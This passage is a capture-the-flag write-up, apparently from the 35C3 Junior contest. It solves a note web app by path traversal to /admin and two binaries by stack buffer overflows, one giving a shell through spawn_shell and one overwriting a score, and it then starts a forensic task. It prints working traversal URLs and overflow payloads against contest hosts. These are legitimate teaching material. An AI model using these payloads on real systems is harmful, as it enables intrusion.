&lt;p&gt;The source of this challenge is available under &lt;strong&gt;/src.tgz&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Observations:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;The &lt;strong&gt;pw&lt;/strong&gt; parameter is the md5 hash of the note’s content.&lt;/li&gt;
  &lt;li&gt;In the code, we see that the &lt;strong&gt;id is a random Integer&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;The code of &lt;strong&gt;view.php&lt;/strong&gt; suggests a LFI vulnerability:
    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;config.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./pws/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.pw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./pws/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.pw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
             &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BACKEND&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;get/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
             &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ERROR!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ERROR!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;The flag will be echoed if we manage to make a GET request to /admin:
    &lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/admin'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
     &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;solution-4&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Combining the &lt;strong&gt;LFI&lt;/strong&gt; with the &lt;strong&gt;get request to /admin&lt;/strong&gt; gives the following payload:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://35.207.120.163/view.php?id=6578216296439429496/../../admin&amp;amp;pw=47bce5c74f589f4867dbd57e9ca9f808&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;id&lt;/strong&gt; and &lt;strong&gt;pw&lt;/strong&gt; are the ones from a test note we’ve created before, they have to be valid in order for the exploit to work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/note-accessible-flag.png&quot; alt=&quot;Note-accessible flag&quot; title=&quot;Note-accessible flag&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;junior-ctf-pwn---1996&quot;&gt;[Junior CTF] Pwn - 1996&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;It’s 1996 all over again!&lt;/p&gt;

  &lt;p&gt;nc 35.207.132.47 22227&lt;/p&gt;

  &lt;p&gt;Difficulty estimate: very easy&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;First pwning challenge of this CTF! A very basic one to warm us up :wink:. We were given this &lt;a href=&quot;http://localhost:4000/assets/2018-12-30/1996.zip&quot; title=&quot;1996 zip&quot;&gt;zip&lt;/a&gt; containing the binary and its C++ source code.&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// compile with -no-pie -fno-stack-protector
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;spawn_shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Which environment variable do you want to read? &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Observations:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;The binary has been compiled without stack protector.&lt;/li&gt;
  &lt;li&gt;The buffer overflow is pretty obvious here.&lt;/li&gt;
  &lt;li&gt;a &lt;strong&gt;spawn_shell&lt;/strong&gt; function is given to help us.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;solution-5&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;The objective here is to &lt;strong&gt;overwrite the return address of the main function with the address of the spawn_shell function&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;We have to &lt;strong&gt;determine the overflow offset&lt;/strong&gt;, either manually or with gdb, then, to &lt;strong&gt;get the address of the spawn shell function&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Overflow offset:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/Pwn/1996&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*1048'&lt;/span&gt; |./1996
Which environment variable &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;span class=&quot;nv&quot;&gt;AAAAAAAA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Segmentation fault
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spawn_shell address:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;objdump &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; ./1996 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;spawn
0000000000400897 &amp;lt;_Z11spawn_shellv&amp;gt;:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we can verify our payload on our local machine without forgetting to catch the standard input with &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; to avoid the shell to close itself immediately:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/Pwn/1996&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*1048+&quot;\x97\x08\x40\x00\x00\x00\x00\x00&quot;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | ./1996
Which environment variable &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
whoami
boiteaklou
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Working! We can now retrieve the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/1996-flag.png&quot; alt=&quot;1996 flag&quot; title=&quot;1996 flag&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;junior-ctf-pwn---poet&quot;&gt;[Junior CTF] Pwn - poet&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;We are looking for the poet of the year:&lt;/p&gt;

  &lt;p&gt;nc 35.207.132.47 22223&lt;/p&gt;

  &lt;p&gt;Difficulty estimate: very easy&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We were given this &lt;a href=&quot;http://localhost:4000/assets/2018-12-30/poet&quot; title=&quot;poet&quot;&gt;ELF 64 executable&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;A bit of &lt;strong&gt;reverse-engineering&lt;/strong&gt; was helpful to understand the functionalities of this program.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The program asks the user to write a poem.&lt;/li&gt;
  &lt;li&gt;It asks a name for the author of the poem.&lt;/li&gt;
  &lt;li&gt;Then, it computes a score to the poem.&lt;/li&gt;
  &lt;li&gt;If we manage to &lt;strong&gt;score 1 000 000 points&lt;/strong&gt;, the flag is won.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Observations:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;We can score 100 points for each word of the following list inside our poem: [“ESPR”, “eat”, “sleep”, “pwn”, “repeat”, “CTF”, “capture”, “flag”].&lt;/li&gt;
  &lt;li&gt;The buffer allocated to the poem is too small for us to write “pwn” a thousand times.&lt;/li&gt;
  &lt;li&gt;Author and Poem fields are &lt;strong&gt;vulnerable to buffer overflows&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/overflow-author.png&quot; alt=&quot;Poet author overflow&quot; title=&quot;Poet author overflow&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;solution-6&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;What we want is to &lt;strong&gt;overwrite the local variable storing the score of the poem&lt;/strong&gt;. This will be done by overflowing from the author buffer.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; First, I wanted to overflow from the poem buffer directly. I managed to overwrite the score but it caused a segmentation fault so I supposed I had to do it from the author buffer.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Once again, we need to determine the overflow offset and the value we want to write in place of the poem’s score.&lt;/p&gt;

&lt;p&gt;The value is pretty easy to determine. We want a score of a million which gives in hex:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;p/x 1000000
&lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xf4240
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The offset can be found using the following technique:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Prepare a very long pattern to detect when the overflow occurs.&lt;/li&gt;
  &lt;li&gt;Set a breakpoint before the poem’s score is compared to 0xf4240.&lt;/li&gt;
  &lt;li&gt;From our previous reverse-engineering, we know that the poem’s score is stored at &lt;strong&gt;RBX+0x440&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Examine the value at &lt;strong&gt;RBX+0x440&lt;/strong&gt; after having submitted the big pattern with gdb.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;aaaa\nAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHIIIIIIII&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r &amp;lt; payload
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;x/d &lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;+0x440
0x6024e0 &amp;lt;poem+1088&amp;gt;:   5280832617179597229
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;x/x &lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;+0x440
0x6024e0 &amp;lt;poem+1088&amp;gt;:   0x49494949494949ad    &lt;span class=&quot;c&quot;&gt;# Score of our poem&lt;/span&gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;p/x &lt;span class=&quot;s2&quot;&gt;&quot;I&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;0x49, 0x0&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the score is overwritten with “IIIIIII”.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; The \n is here to separate the poem and the author fields.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;From there, we have everything needed to build our payload and to retrieve the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/poet-flag.png&quot; alt=&quot;Poet flag&quot; title=&quot;Poet flag&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;junior-ctf-forensic---rare_mount&quot;&gt;[Junior CTF] Forensic - rare_mount&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Little or big, we do not care!&lt;/p&gt;

  &lt;p&gt;FS&lt;/p&gt;

  &lt;p&gt;Difficulty estimate: Easy&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;All credit goes to &lt;strong&gt;$in&lt;/strong&gt; who solved all of the forensic challenges alone and is the original author of the following writeups. :thumbsup:&lt;/p&gt;

&lt;p&gt;An &lt;a href=&quot;http://localhost:4000/assets/2018-12-30/rare_mount&quot; title=&quot;rare_mount&quot;&gt;unknown file&lt;/a&gt; was all that was given for this challenge.&lt;/p&gt;

&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; on it was our first reflex but it didn’t gave much information:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/For&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file rare-fs.bin
rare-fs.bin: data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;binwalk&lt;/code&gt;, on the other hand, provided a way more intersting output:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/For&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk rare-fs.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
0             0x0             JFFS2 filesystem, big endian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

